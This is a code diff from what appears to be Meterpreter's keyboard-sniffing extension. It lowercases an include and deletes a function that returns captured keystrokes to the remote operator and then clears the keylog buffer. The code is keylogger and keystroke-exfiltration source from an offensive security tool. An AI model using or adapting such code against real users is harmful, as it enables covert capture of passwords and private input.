@@ -2,7 +2,7 @@
 #include "common_metapi.h"
 #include "keyboard.h"
 #include <tchar.h>
-#include <Psapi.h>
+#include <psapi.h>
 
 extern HMODULE hookLibrary;
 extern HINSTANCE hAppInstance;
@@ -286,30 +286,6 @@ DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
 		SendMessageA(ghwnd, WM_CLOSE, 0, 0);
 		CloseHandle(tKeyScan);
 		tKeyScan = NULL;
-	}
-	else {
-		result = 1;
-	}
-
-	// Transmit the response
-	met_api->packet.transmit_response(result, remote, response);
-	return ERROR_SUCCESS;
-}
-
-/*
- * Returns the sniffed keystrokes
- */
-
-DWORD request_ui_get_keys(Remote *remote, Packet *request)
-{
-	Packet *response = met_api->packet.create_response(request);
-	DWORD result = ERROR_SUCCESS;
-
-  if (tKeyScan) {
-		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
-		met_api->packet.add_tlv_string(response, TLV_TYPE_KEYS_DUMP, (LPCSTR)g_keyscan_buf);
-		memset(g_keyscan_buf, 0, KEYBUFSIZE);
-		g_idx = 0;
 	}
 	else {
 		result = 1;
